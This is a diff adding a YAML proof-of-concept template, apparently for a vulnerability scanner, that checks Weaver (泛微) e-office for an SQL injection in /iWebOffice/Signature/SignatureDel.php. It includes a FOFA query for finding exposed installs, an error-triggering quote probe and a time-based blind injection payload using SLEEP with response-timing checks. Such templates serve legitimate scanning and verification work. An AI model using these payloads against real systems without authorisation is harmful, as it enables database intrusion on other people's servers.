@@ -1,0 +1,21 @@
+id: poc-yaml-weaver-e-office-signaturedel-php-sqli
+info:
+  name: 泛微OA e-office SignatureDel.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: e-office
+  fofa: app="泛微-EOffice"
+variables:
+  t1: random_int(2,5)
+  t2: t1 + t1
+  t3: t2 + 2
+requests:
+- method: GET
+  path: /iWebOffice/Signature/SignatureDel.php?SignatureID=1'
+  expression: status_code == 200 && contains(body,"valid MySQL") && contains(body,"SignatureDel.php")
+- method: GET
+  path: /iWebOffice/Signature/SignatureDel.php?SignatureID=1+AND+(SELECT+7431+FROM+(SELECT(SLEEP({{.t1}})))LtXU)
+  expression: status_code == 302 && body == "" && contains(headers,"LOGIN_LANG=")
+    && duration > t2 && duration < t3
+transport: http
